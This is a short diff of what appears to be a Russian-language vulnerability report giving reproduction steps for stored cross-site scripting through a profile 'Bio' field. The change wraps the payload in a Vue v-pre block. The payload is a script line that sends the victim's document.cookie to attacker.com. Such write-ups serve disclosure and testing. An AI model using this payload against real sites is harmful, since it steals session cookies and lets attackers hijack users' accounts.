@@ -852,7 +852,9 @@ https://app.example.com/api/v1/users/profile/update
 2. Перейдите на: https://app.example.com/profile/edit
 3. В поле "Bio" введите следующий payload:
    ```
+<div v-pre>
    <script>document.location='https://attacker.com/?c='+document.cookie</script>
+</div>
    ```
 4. Нажмите "Save Profile"
 5. Откройте профиль атакующего под другим аккаунтом (victim@test.com):
